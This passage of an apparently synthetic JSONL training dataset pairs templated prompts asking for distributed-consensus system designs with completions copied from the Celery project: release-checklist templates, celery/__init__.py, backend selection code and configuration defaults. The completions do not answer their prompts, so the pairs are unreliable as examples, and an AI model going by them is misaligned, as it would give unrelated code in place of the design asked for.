breaking changes, the release manager should discuss with the maintainers to determine the best course of action if an obvious solution is not apparent.\n\n## 3. Compile Changelog\nThe release changelog is set in two different places:\n1. The [Changelog.rst](https://github.com/celery/celery/blob/main/Changelog.rst) that uses the RST format.\n2. The GitHub Release auto-generated changelog that uses the Markdown format. This is auto-generated by the GitHub Draft Release UI.\n\n> ⚠️ **Warning:** The pre-commit changes should not be included in the changelog.\n\nTo generate the changelog automatically, [draft a new release](https://github.com/celery/celery/releases/new) on GitHub using a fake new version tag for the automatic changelog generation. Notice the actual tag creation is done **on publish** so we can use that to generate the changelog and then delete the draft release without publishing it thus avoiding creating a new tag.\n\n- Create a new tag\n<img width=\"502\" alt=\"CleanShot 2023-09-05 at 22 06 24@2x\" src=\"https://github.com/celery/celery/assets/4662342/69d7eb78-0dd1-4a37-9266-d718e2340fad\">\n\n- Generate Markdown release notes\n<img width=\"389\" alt=\"CleanShot 2023-09-05 at 22 13 39@2x\" src=\"https://github.com/celery/celery/assets/4662342/83c6a4b6-1676-496e-8d75-5a6b10352b5b\">\n\n- Copy the generated release notes.\n\n- Delete the draft release without publishing it.\n\n### 3.1 Changelog.rst\nOnce you have the actual changes, you need to convert it to rst format and add it to the [Changelog.rst](https://github.com/celery/celery/blob/main/Changelog.rst) file. The new version block needs to follow the following format:\n```rst\n.. _version-x.y.z:\n\nx.y.z\n=====\n\n:release-date: YYYY-MM-DD HH:MM P.M/A.M TimeZone\n:release-by: Release Manager Name\n\nChanges list in RST format.\n```\n\nThese changes will reflect in the [Change history](https://docs.celeryq.dev/en/stable/changelog.html) section of the documentation.\n\n### 3.2 Changelog PR\nThe changes to the [Changelog.rst](https://github.com/celery/celery/blob/main/Changelog.rst) file should be submitted as a PR. This will PR should be the last merged PR before the release.\n\n## 4. Release\n### 4.1 Prepare releasing environment\nBefore moving forward with the release, the release manager should ensure that bumpversion and twine are installed. These are required to publish the release.\n\n### 4.2 Bump version\nThe release manager should bump the version using the following command:\n```bash\nbumpversion patch\n```\nThe changes should be pushed directly to main by the release manager.\n\nAt this point, the git log should appear somewhat similar to this:\n```\ncommit XXX (HEAD -> main, tag: vX.Y.Z, upstream/main, origin/main)\nAuthor: Release Manager\nDate:   YYY\n\n    Bump version: a.b.c → x.y.z\n\ncommit XXX\nAuthor: Release Manager\nDate:   YYY\n\n    Added changelog for vX.Y.Z (#1234)\n```\nIf everything looks good, the bump version commit can be directly pushed to `main`:\n```bash\ngit push origin main --tags\n```\n\n### 4.3 Publish release to PyPI\nThe release manager should publish the release to PyPI using the following commands running under the root directory of the repository:\n```bash\npython setup.py clean build sdist bdist_wheel\n```\nIf the build is successful, the release manager should publish the release to PyPI using the following command:\n```bash\ntwine upload dist/celery-X.Y.Z*\n```\n\n> ⚠️ **Warning:** The release manager should double check that the release details are correct (project/version) before publishing the release to PyPI.\n\n> ⚠️ **Critical Reminder:** Should the released package prove to be faulty or need retraction for any reason, do not delete it from PyPI. The appropriate course of action is to \"yank\" the release.\n\n## Release Announcement\nAfter the release is published, the release manager should create a new GitHub Release and set it as the latest release.\n\n<img width=\"401\" alt=\"CleanShot 2023-09-05 at 22 51 24@2x\" src=\"https://github.com/celery/celery/assets/4662342/6edcba33-b6a9-4242-85e8-8260a2ede868\">\n\n### Add Release Notes\nOn a per-case basis, the release manager may also attach an additional release note to the auto-generated release notes. This is usually done when there are important changes that are not reflected in the auto-generated release notes.\n\n### OpenCollective Update\nAfter successfully publishing the new release, the release manager is responsible for announcing it on the project's OpenCollective [page](https://opencollective.com/celery/updates). This is to engage with the community and keep backers and sponsors in the loop.\n\n\n", "metadata": {"source": "github.com/celery/celery", "file_path": ".github/ISSUE_TEMPLATE/Minor-Version-Release-Checklist.md", "language": "markdown", "complexity": "medium", "star_count": 26879, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 137}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Patch Version Release Checklist\nabout: About to release a new patch version? (Maintainers Only!)\ntitle: ''\nlabels: ''\nassignees: ''\n\n---\n\n# Patch Release Overview: v<!-- Insert Version Here, e.g. 1.2.3 -->\n\nThis issue will summarize the status and discussion in preparation for the new release. It will be used to track the progress of the release and to ensure that all the necessary steps are taken. It will serve as a checklist for the release and will be used to communicate the status of the release to the community.\n\n> ⚠️ **Warning:** The release checklist is a living document. It will be updated as the release progresses. Please check back often to ensure that you are up to date with the latest information.\n\n## Checklist\n- [ ] Codebase Stability\n- [ ] Breaking Changes Validation\n- [ ] Compile Changelog\n- [ ] Release\n- [ ] Release Announcement\n\n# Release Details\nThe release manager is responsible for completing the release end-to-end ensuring that all the necessary steps are taken and that the release is completed in a timely manner. This is usually the owner of the release issue but may be assigned to a different maintainer if necessary.\n\n- Release Manager: <!-- Insert Release Manager Here -->\n- Release Date: <!-- Insert Release Date Here -->\n- Release Branch: `main`\n\n# Release Steps\nThe release manager is expected to execute the checklist below. The release manager is also responsible for ensuring that the checklist is updated as the release progresses. Any changes or issues should be communicated under this issue for centralized tracking.\n\n## 1. Codebase Stability\n- [ ] The `main` branch build passes\n\n    [![Build Status](https://github.com/celery/celery/actions/workflows/python-package.yml/badge.svg)](https://github.com/celery/celery/actions/workflows/python-package.yml)\n\n## 2. Breaking Changes Validation\nA patch release should not contain any breaking changes. The release manager is responsible for reviewing all of the merged PRs since the last release to ensure that there are no breaking changes. If there are any breaking changes, the release manager should discuss with the maintainers to determine the best course of action if an obvious solution is not apparent.\n\n## 3. Compile Changelog\nThe release changelog is set in two different places:\n1. The [Changelog.rst](https://github.com/celery/celery/blob/main/Changelog.rst) that uses the RST format.\n2. The GitHub Release auto-generated changelog that uses the Markdown format. This is auto-generated by the GitHub Draft Release UI.\n\n> ⚠️ **Warning:** The pre-commit changes should not be included in the changelog.\n\nTo generate the changelog automatically, [draft a new release](https://github.com/celery/celery/releases/new) on GitHub using a fake new version tag for the automatic changelog generation. Notice the actual tag creation is done **on publish** so we can use that to generate the changelog and then delete the draft release without publishing it thus avoiding creating a new tag.\n\n- Create a new tag\n<img width=\"502\" alt=\"CleanShot 2023-09-05 at 22 06 24@2x\" src=\"https://github.com/celery/celery/assets/4662342/69d7eb78-0dd1-4a37-9266-d718e2340fad\">\n\n- Generate Markdown release notes\n<img width=\"389\" alt=\"CleanShot 2023-09-05 at 22 13 39@2x\" src=\"https://github.com/celery/celery/assets/4662342/83c6a4b6-1676-496e-8d75-5a6b10352b5b\">\n\n- Copy the generated release notes.\n\n- Delete the draft release without publishing it.\n\n### 3.1 Changelog.rst\nOnce you have the actual changes, you need to convert it to rst format and add it to the [Changelog.rst](https://github.com/celery/celery/blob/main/Changelog.rst) file. The new version block needs to follow the following format:\n```rst\n.. _version-x.y.z:\n\nx.y.z\n=====\n\n:release-date: YYYY-MM-DD HH:MM P.M/A.M TimeZone\n:release-by: Release Manager Name\n\nChanges list in RST format.\n```\n\nThese changes will reflect in the [Change history](https://docs.celeryq.dev/en/stable/changelog.html) section of the documentation.\n\n### 3.2 Changelog PR\nThe changes to the [Changelog.rst](https://github.com/celery/celery/blob/main/Changelog.rst) file should be submitted as a PR. This will PR should be the last merged PR before the release.\n\n## 4. Release\n### 4.1 Prepare releasing environment\nBefore moving forward with the release, the release manager should ensure that bumpversion and twine are installed. These are required to publish the release.\n\n### 4.2 Bump version\nThe release manager should bump the version using the following command:\n```bash\nbumpversion patch\n```\nThe changes should be pushed directly to main by the release manager.\n\nAt this point, the git log should appear somewhat similar to this:\n```\ncommit XXX (HEAD -> main, tag: vX.Y.Z, upstream/main, origin/main)\nAuthor: Release Manager\nDate:   YYY\n\n    Bump version: a.b.c → x.y.z\n\ncommit XXX\nAuthor: Release Manager\nDate:   YYY\n\n    Added changelog for vX.Y.Z (#1234)\n```\nIf everything looks good, the bump version commit can be directly pushed to `main`:\n```bash\ngit push origin main --tags\n```\n\n### 4.3 Publish release to PyPI\nThe release manager should publish the release to PyPI using the following commands running under the root directory of the repository:\n```bash\npython setup.py clean build sdist bdist_wheel\n```\nIf the build is successful, the release manager should publish the release to PyPI using the following command:\n```bash\ntwine upload dist/celery-X.Y.Z*\n```\n\n> ⚠️ **Warning:** The release manager should double check that the release details are correct (project/version) before publishing the release to PyPI.\n\n> ⚠️ **Critical Reminder:** Should the released package prove to be faulty or need retraction for any reason, do not delete it from PyPI. The appropriate course of action is to \"yank\" the release.\n\n## Release Announcement\nAfter the release is published, the release manager should create a new GitHub Release and set it as the latest release.\n\n<img width=\"401\" alt=\"CleanShot 2023-09-05 at 22 51 24@2x\" src=\"https://github.com/celery/celery/assets/4662342/6edcba33-b6a9-4242-85e8-8260a2ede868\">\n\n### Add Release Notes\nOn a per-case basis, the release manager may also attach an additional release note to the auto-generated release notes. This is usually done when there are important changes that are not reflected in the auto-generated release notes.\n\n### OpenCollective Update\nAfter successfully publishing the new release, the release manager is responsible for announcing it on the project's OpenCollective [page](https://opencollective.com/celery/updates). This is to engage with the community and keep backers and sponsors in the loop.\n\n\n# Release Blockers\n<!-- Mention if exist -->", "metadata": {"source": "github.com/celery/celery", "file_path": ".github/ISSUE_TEMPLATE/Patch-Version-Release-Checklist.md", "language": "markdown", "complexity": "medium", "star_count": 26879, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 136}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Distributed Task Queue.\"\"\"\n# :copyright: (c) 2017-2026 Asif Saif Uddin, celery core and individual\n#                 contributors, All rights reserved.\n# :copyright: (c) 2015-2016 Ask Solem.  All rights reserved.\n# :copyright: (c) 2012-2014 GoPivotal, Inc., All rights reserved.\n# :copyright: (c) 2009 - 2012 Ask Solem and individual contributors,\n#                 All rights reserved.\n# :license:   BSD (3 Clause), see LICENSE for more details.\n\nimport os\nimport re\nimport sys\nfrom collections import namedtuple\n\n# Lazy loading\nfrom . import local\n\nSERIES = 'immunity'\n\n__version__ = '5.5.3'\n__author__ = 'Ask Solem'\n__contact__ = 'auvipy@gmail.com'\n__homepage__ = 'https://docs.celeryq.dev/'\n__docformat__ = 'restructuredtext'\n__keywords__ = 'task job queue distributed messaging actor'\n\n# -eof meta-\n\n__all__ = (\n    'Celery', 'bugreport', 'shared_task', 'Task',\n    'current_app', 'current_task', 'maybe_signature',\n    'chain', 'chord', 'chunks', 'group', 'signature',\n    'xmap', 'xstarmap', 'uuid',\n)\n\nVERSION_BANNER = f'{__version__} ({SERIES})'\n\nversion_info_t = namedtuple('version_info_t', (\n    'major', 'minor', 'micro', 'releaselevel', 'serial',\n))\n\n# bumpversion can only search for {current_version}\n# so we have to parse the version here.\n_temp = re.match(\n    r'(\\d+)\\.(\\d+).(\\d+)(.+)?', __version__).groups()\nVERSION = version_info = version_info_t(\n    int(_temp[0]), int(_temp[1]), int(_temp[2]), _temp[3] or '', '')\ndel _temp\ndel re\n\nif os.environ.get('C_IMPDEBUG'):  # pragma: no cover\n    import builtins\n\n    def debug_import(name, locals=None, globals=None,\n                     fromlist=None, level=-1, real_import=builtins.__import__):\n        glob = globals or getattr(sys, 'emarfteg_'[::-1])(1).f_globals\n        importer_name = glob and glob.get('__name__') or 'unknown'\n        print(f'-- {importer_name} imports {name}')\n        return real_import(name, locals, globals, fromlist, level)\n    builtins.__import__ = debug_import\n\n# This is never executed, but tricks static analyzers (PyDev, PyCharm,\n# pylint, etc.) into knowing the types of these symbols, and what\n# they contain.\nSTATICA_HACK = True\nglobals()['kcah_acitats'[::-1].upper()] = False\nif STATICA_HACK:  # pragma: no cover\n    from celery._state import current_app, current_task\n    from celery.app import shared_task\n    from celery.app.base import Celery\n    from celery.app.task import Task\n    from celery.app.utils import bugreport\n    from celery.canvas import (chain, chord, chunks, group, maybe_signature, signature, subtask, xmap,  # noqa\n                               xstarmap)\n    from celery.utils import uuid\n\n# Eventlet/gevent patching must happen before importing\n# anything else, so these tools must be at top-level.\n\n\ndef _find_option_with_arg(argv, short_opts=None, long_opts=None):\n    \"\"\"Search argv for options specifying short and longopt alternatives.\n\n    Returns:\n        str: value for option found\n    Raises:\n        KeyError: if option not found.\n    \"\"\"\n    for i, arg in enumerate(argv):\n        if arg.startswith('-'):\n            if long_opts and arg.startswith('--'):\n                name, sep, val = arg.partition('=')\n                if name in long_opts:\n                    return val if sep else argv[i + 1]\n            if short_opts and arg in short_opts:\n                return argv[i + 1]\n    raise KeyError('|'.join(short_opts or [] + long_opts or []))\n\n\ndef _patch_eventlet():\n    import eventlet.debug\n\n    eventlet.monkey_patch()\n    blockdetect = float(os.environ.get('EVENTLET_NOBLOCK', 0))\n    if blockdetect:\n        eventlet.debug.hub_blocking_detection(blockdetect, blockdetect)\n\n\ndef _patch_gevent():\n    import gevent.monkey\n    import gevent.signal\n\n    gevent.monkey.patch_all()\n\n\ndef maybe_patch_concurrency(argv=None, short_opts=None,\n                            long_opts=None, patches=None):\n    \"\"\"Apply eventlet/gevent monkeypatches.\n\n    With short and long opt alternatives that specify the command line\n    option to set the pool, this makes sure that anything that needs\n    to be patched is completed as early as possible.\n    (e.g., eventlet/gevent monkey patches).\n    \"\"\"\n    argv = argv if argv else sys.argv\n    short_opts = short_opts if short_opts else ['-P']\n    long_opts = long_opts if long_opts else ['--pool']\n    patches = patches if patches else {'eventlet': _patch_eventlet,\n                                       'gevent': _patch_gevent}\n    try:\n        pool = _find_option_with_arg(argv, short_opts, long_opts)\n    except KeyError:\n        pass\n    else:\n        try:\n            patcher = patches[pool]\n        except KeyError:\n            pass\n        else:\n            patcher()\n\n        # set up eventlet/gevent environments ASAP\n        from celery import concurrency\n        if pool in concurrency.get_available_pool_names():\n            concurrency.get_implementation(pool)\n\n\n# this just creates a new module, that imports stuff on first attribute\n# access.  This makes the library faster to use.\nold_module, new_module = local.recreate_module(  # pragma: no cover\n    __name__,\n    by_module={\n        'celery.app': ['Celery', 'bugreport', 'shared_task'],\n        'celery.app.task': ['Task'],\n        'celery._state': ['current_app', 'current_task'],\n        'celery.canvas': [\n            'Signature', 'chain', 'chord', 'chunks', 'group',\n            'signature', 'maybe_signature', 'subtask',\n            'xmap', 'xstarmap',\n        ],\n        'celery.utils': ['uuid'],\n    },\n    __package__='celery', __file__=__file__,\n    __path__=__path__, __doc__=__doc__, __version__=__version__,\n    __author__=__author__, __contact__=__contact__,\n    __homepage__=__homepage__, __docformat__=__docformat__, local=local,\n    VERSION=VERSION, SERIES=SERIES, VERSION_BANNER=VERSION_BANNER,\n    version_info_t=version_info_t,\n    version_info=version_info,\n    maybe_patch_concurrency=maybe_patch_concurrency,\n    _find_option_with_arg=_find_option_with_arg,\n)\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/__init__.py", "language": "python", "complexity": "medium", "star_count": 26879, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 173}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Backend selection.\"\"\"\nimport sys\nimport types\n\nfrom celery._state import current_app\nfrom celery.exceptions import ImproperlyConfigured, reraise\nfrom celery.utils.imports import load_extension_class_names, symbol_by_name\n\n__all__ = ('by_name', 'by_url')\n\nUNKNOWN_BACKEND = \"\"\"\nUnknown result backend: {0!r}.  Did you spell that correctly? ({1!r})\n\"\"\"\n\nBACKEND_ALIASES = {\n    'rpc': 'celery.backends.rpc.RPCBackend',\n    'cache': 'celery.backends.cache:CacheBackend',\n    'redis': 'celery.backends.redis:RedisBackend',\n    'rediss': 'celery.backends.redis:RedisBackend',\n    'sentinel': 'celery.backends.redis:SentinelBackend',\n    'mongodb': 'celery.backends.mongodb:MongoBackend',\n    'db': 'celery.backends.database:DatabaseBackend',\n    'database': 'celery.backends.database:DatabaseBackend',\n    'elasticsearch': 'celery.backends.elasticsearch:ElasticsearchBackend',\n    'cassandra': 'celery.backends.cassandra:CassandraBackend',\n    'couchbase': 'celery.backends.couchbase:CouchbaseBackend',\n    'couchdb': 'celery.backends.couchdb:CouchBackend',\n    'cosmosdbsql': 'celery.backends.cosmosdbsql:CosmosDBSQLBackend',\n    'riak': 'celery.backends.riak:RiakBackend',\n    'file': 'celery.backends.filesystem:FilesystemBackend',\n    'disabled': 'celery.backends.base:DisabledBackend',\n    'consul': 'celery.backends.consul:ConsulBackend',\n    'dynamodb': 'celery.backends.dynamodb:DynamoDBBackend',\n    'azureblockblob': 'celery.backends.azureblockblob:AzureBlockBlobBackend',\n    'arangodb': 'celery.backends.arangodb:ArangoDbBackend',\n    's3': 'celery.backends.s3:S3Backend',\n    'gs': 'celery.backends.gcs:GCSBackend',\n}\n\n\ndef by_name(backend=None, loader=None,\n            extension_namespace='celery.result_backends'):\n    \"\"\"Get backend class by name/alias.\"\"\"\n    backend = backend or 'disabled'\n    loader = loader or current_app.loader\n    aliases = dict(BACKEND_ALIASES, **loader.override_backends)\n    aliases.update(load_extension_class_names(extension_namespace))\n    try:\n        cls = symbol_by_name(backend, aliases)\n    except ValueError as exc:\n        reraise(ImproperlyConfigured, ImproperlyConfigured(\n            UNKNOWN_BACKEND.strip().format(backend, exc)), sys.exc_info()[2])\n    if isinstance(cls, types.ModuleType):\n        raise ImproperlyConfigured(UNKNOWN_BACKEND.strip().format(\n            backend, 'is a Python module, not a backend class.'))\n    return cls\n\n\ndef by_url(backend=None, loader=None):\n    \"\"\"Get backend class by URL.\"\"\"\n    url = None\n    if backend and '://' in backend:\n        url = backend\n        scheme, _, _ = url.partition('://')\n        if '+' in scheme:\n            backend, url = url.split('+', 1)\n        else:\n            backend = scheme\n    return by_name(backend, loader), url\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/app/backends.py", "language": "python", "complexity": "simple", "star_count": 26879, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 70}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Configuration introspection and defaults.\"\"\"\nfrom collections import deque, namedtuple\nfrom datetime import timedelta\n\nfrom celery.utils.functional import memoize\nfrom celery.utils.serialization import strtobool\n\n__all__ = ('Option', 'NAMESPACES', 'flatten', 'find')\n\n\nDEFAULT_POOL = 'prefork'\n\nDEFAULT_ACCEPT_CONTENT = ('json',)\nDEFAULT_PROCESS_LOG_FMT = \"\"\"\n    [%(asctime)s: %(levelname)s/%(processName)s] %(message)s\n\"\"\".strip()\nDEFAULT_TASK_LOG_FMT = \"\"\"[%(asctime)s: %(levelname)s/%(processName)s] \\\n%(task_name)s[%(task_id)s]: %(message)s\"\"\"\n\nDEFAULT_SECURITY_DIGEST = 'sha256'\n\n\nOLD_NS = {'celery_{0}'}\nOLD_NS_BEAT = {'celerybeat_{0}'}\nOLD_NS_WORKER = {'celeryd_{0}'}\n\nsearchresult = namedtuple('searchresult', ('namespace', 'key', 'type'))\n\n\ndef Namespace(__old__=None, **options):\n    if __old__ is not None:\n        for key, opt in options.items():\n            if not opt.old:\n                opt.old = {o.format(key) for o in __old__}\n    return options\n\n\ndef old_ns(ns):\n    return {f'{ns}_{{0}}'}\n\n\nclass Option:\n    \"\"\"Describes a Celery configuration option.\"\"\"\n\n    alt = None\n    deprecate_by = None\n    remove_by = None\n    old = set()\n    typemap = {'string': str, 'int': int, 'float': float, 'any': lambda v: v,\n               'bool': strtobool, 'dict': dict, 'tuple': tuple}\n\n    def __init__(self, default=None, *args, **kwargs):\n        self.default = default\n        self.type = kwargs.get('type') or 'string'\n        for attr, value in kwargs.items():\n            setattr(self, attr, value)\n\n    def to_python(self, value):\n        return self.typemap[self.type](value)\n\n    def __repr__(self):\n        return '<Option: type->{} default->{!r}>'.format(self.type,\n                                                         self.default)\n\n\nNAMESPACES = Namespace(\n    accept_content=Option(DEFAULT_ACCEPT_CONTENT, type='list', old=OLD_NS),\n    result_accept_content=Option(None, type='list'),\n    enable_utc=Option(True, type='bool'),\n    imports=Option((), type='tuple', old=OLD_NS),\n    include=Option((), type='tuple', old=OLD_NS),\n    timezone=Option(type='string', old=OLD_NS),\n    beat=Namespace(\n        __old__=OLD_NS_BEAT,\n\n        max_loop_interval=Option(0, type='float'),\n        schedule=Option({}, type='dict'),\n        scheduler=Option('celery.beat:PersistentScheduler'),\n        schedule_filename=Option('celerybeat-schedule'),\n        sync_every=Option(0, type='int'),\n        cron_starting_deadline=Option(None, type=int)\n    ),\n    broker=Namespace(\n        url=Option(None, type='string'),\n        read_url=Option(None, type='string'),\n        write_url=Option(None, type='string'),\n        transport=Option(type='string'),\n        transport_options=Option({}, type='dict'),\n        connection_timeout=Option(4, type='float'),\n        connection_retry=Option(True, type='bool'),\n        connection_retry_on_startup=Option(None, type='bool'),\n        connection_max_retries=Option(100, type='int'),\n        channel_error_retry=Option(False, type='bool'),\n        failover_strategy=Option(None, type='string'),\n        heartbeat=Option(120, type='int'),\n        heartbeat_checkrate=Option(3.0, type='int'),\n        login_method=Option(None, type='string'),\n        native_delayed_delivery_queue_type=Option(default='quorum', type='string'),\n        pool_limit=Option(10, type='int'),\n        use_ssl=Option(False, type='bool'),\n\n        host=Option(type='string'),\n        port=Option(type='int'),\n        user=Option(type='string'),\n        password=Option(type='string'),\n        vhost=Option(type='string'),\n    ),\n    cache=Namespace(\n        __old__=old_ns('celery_cache'),\n\n        backend=Option(),\n        backend_options=Option({}, type='dict'),\n    ),\n    cassandra=Namespace(\n        entry_ttl=Option(type='float'),\n        keyspace=Option(type='string'),\n        port=Option(type='string'),\n        read_consistency=Option(type='string'),\n        servers=Option(type='list'),\n        bundle_path=Option(type='string'),\n        table=Option(type='string'),\n        write_consistency=Option(type='string'),\n        auth_provider=Option(type='string'),\n        auth_kwargs=Option(type='string'),\n        options=Option({}, type='dict'),\n    ),\n    s3=Namespace(\n        access_key_id=Option(type='string'),\n        secret_access_key=Option(type='string'),\n        bucket=Option(type='string'),\n        base_path=Option(type='string'),\n        endpoint_url=Option(type='string'),\n        region=Option(type='string'),\n    ),\n    azureblockblob=Namespace(\n        container_name=Option('celery', type='string'),\n        retry_initial_backoff_sec=Option(2, type='int'),\n        retry_increment_base=Option(2, type='int'),\n        retry_max_attempts=Option(3, type='int'),\n        base_path=Option('', type='string'),\n        connection_timeout=Option(20, type='int'),\n        read_timeout=Option(120, type='int'),\n    ),\n    gcs=Namespace(\n        bucket=Option(type='string'),\n        project=Option(type='string'),\n        base_path=Option('', type='string'),\n        ttl=Option(0, type='float'),\n    ),\n    control=Namespace(\n        queue_ttl=Option(300.0, type='float'),\n        queue_expires=Option(10.0, type='float'),\n        exchange=Option('celery', type='string'),\n    ),\n    couchbase=Namespace(\n        __old__=old_ns('celery_couchbase'),\n\n        backend_settings=Option(None, type='dict'),\n    ),\n    arangodb=Namespace(\n        __old__=old_ns('celery_arangodb'),\n        backend_settings=Option(None, type='dict')\n    ),\n    mongodb=Namespace(\n        __old__=old_ns('celery_mongodb'),\n\n        backend_settings=Option(type='dict'),\n    ),\n    cosmosdbsql=Namespace(\n        database_name=Option('celerydb', type='string'),\n        collection_name=Option('celerycol', type='string'),\n        consistency_level=Option('Session', type='string'),\n        max_retry_attempts=Option(9, type='int'),\n        max_retry_wait_time=Option(30, type='int'),\n    ),\n    event=Namespace(\n        __old__=old_ns('celery_event'),\n\n        queue_expires=Option(60.0, type='float'),\n        queue_ttl=Option(5.0, type='float'),\n        queue_prefix=Option('celeryev'),\n        serializer=Option('json'),\n        exchange=Option('celeryev', type='string'),\n    ),\n    redis=Namespace(\n        __old__=old_ns('celery_redis'),\n\n        backend_use_ssl=Option(type='dict'),\n        db=Option(type='int'),\n        host=Option(type='string'),\n        max_connections=Option(type='int'),\n        username=Option(type='string'),\n        password=Option(type='string'),\n        port=Option(type='int'),\n        socket_timeout=Option(120.0, type='float'),\n        socket_connect_timeout=Option(None, type='float'),\n        retry_on_timeout=Option(False, type='bool'),\n        socket_keepalive=Option(False, type='bool'),\n    ),\n    result=Namespace(\n        __old__=old_ns('celery_result'),\n\n        backend=Option(type='string'),\n        cache_max=Option(\n            -1,\n            type='int', old={'celery_max_cached_results'},\n        ),\n        compression=Option(type='str'),\n        exchange=Option('celeryresults'),\n        exchange_type=Option('direct'),\n        expires=Option(\n            timedelta(days=1),\n            type='float', old={'celery_task_result_expires'},\n        ),\n        persistent=Option(None, type='bool'),\n        extended=Option(False, type='bool'),\n        serializer=Option('json'),\n        backend_transport_options=Option({}, type='dict'),\n        chord_retry_interval=Option(1.0, type='float'),\n        chord_join_timeout=Option(3.0, type='float'),\n        backend_max_sleep_between_retries_ms=Option(10000, type='int'),\n        backend_max_retries=Option(float(\"inf\"), type='float'),\n        backend_base_sleep_between_retries_ms=Option(10, type='int'),\n        backend_always_retry=Option(False, type='bool'),\n    ),\n    elasticsearch=Namespace(\n        __old__=old_ns('celery_elasticsearch'),\n\n        retry_on_timeout=Option(type='bool'),\n        max_retries=Option(type='int'),\n        timeout=Option(type='float'),\n        save_meta_as_text=Option(True, type='bool'),\n    ),\n    security=Namespace(\n        __old__=old_ns('celery_security'),\n\n        certificate=Option(type='string'),\n        cert_store=Option(type='string'),\n        key=Option(type='string'),\n        key_password=Option(type='bytes'),\n        digest=Option(DEFAULT_SECURITY_DIGEST, type='string'),\n    ),\n    database=Namespace(\n        url=Option(old={'celery_result_dburi'}),\n        engine_options=Option(\n            type='dict', old={'celery_result_engine_options'},\n        ),\n        short_lived_sessions=Option(\n            False, type='bool', old={'celery_result_db_short_lived_sessions'},\n        ),\n        table_schemas=Option(type='dict'),\n        table_names=Option(type='dict', old={'celery_result_db_tablenames'}),\n        create_tables_at_setup=Option(True, type='bool'),\n    ),\n    task=Namespace(\n        __old__=OLD_NS,\n        acks_late=Option(False, type='bool'),\n        acks_on_failure_or_timeout=Option(True, type='bool'),\n        always_eager=Option(False, type='bool'),\n        annotations=Option(type='any'),\n        compression=Option(type='string', old={'celery_message_compression'}),\n        create_missing_queues=Option(True, type='bool'),\n        inherit_parent_priority=Option(False, type='bool'),\n        default_delivery_mode=Option(2, type='string'),\n        default_queue=Option('celery'),\n        default_queue_type=Option('classic', type='string'),\n        default_exchange=Option(None, type='string'),  # taken from queue\n        default_exchange_type=Option('direct'),\n        default_routing_key=Option(None, type='string'),  # taken from queue\n        default_rate_limit=Option(type='string'),\n        default_priority=Option(None, type='string'),\n        eager_propagates=Option(\n            False, type='bool', old={'celery_eager_propagates_exceptions'},\n        ),\n        ignore_result=Option(False, type='bool'),\n        store_eager_result=Option(False, type='bool'),\n        protocol=Option(2, type='int', old={'celery_task_protocol'}),\n        publish_retry=Option(\n            True, type='bool', old={'celery_task_publish_retry'},\n        ),\n        publish_retry_policy=Option(\n            {'max_retries': 3,\n             'interval_start': 0,\n             'interval_max': 1,\n             'interval_step': 0.2},\n            type='dict', old={'celery_task_publish_retry_policy'},\n        ),\n        queues=Option(type='dict'),\n        queue_max_priority=Option(None, type='int'),\n        reject_on_worker_lost=Option(type='bool'),\n        remote_tracebacks=Option(False, type='bool'),\n        routes=Option(type='any'),\n        send_sent_event=Option(\n            False, type='bool', old={'celery_send_task_sent_event'},\n        ),\n        serializer=Option('json', old={'celery_task_serializer'}),\n        soft_time_limit=Option(\n            type='float', old={'celeryd_task_soft_time_limit'},\n        ),\n        time_limit=Option(\n            type='float', old={'celeryd_task_time_limit'},\n        ),\n        store_errors_even_if_ignored=Option(False, type='bool'),\n        track_started=Option(False, type='bool'),\n        allow_error_cb_on_chord_header=Option(False, type='bool'),\n    ),\n    worker=Namespace(\n        __old__=OLD_NS_WORKER,\n        agent=Option(None, type='string'),\n        autoscaler=Option('celery.worker.autoscale:Autoscaler'),\n        cancel_long_running_tasks_on_connection_loss=Option(\n            False, type='bool'\n        ),\n        soft_shutdown_timeout=Option(0.0, type='float'),\n        enable_soft_shutdown_on_idle=Option(False, type='bool'),\n        concurrency=Option(None, type='int'),\n        consumer=Option('celery.worker.consumer:Consumer', type='string'),\n        direct=Option(False, type='bool', old={'celery_worker_direct'}),\n        disable_rate_limits=Option(\n            False, type='bool', old={'celery_disable_rate_limits'},\n    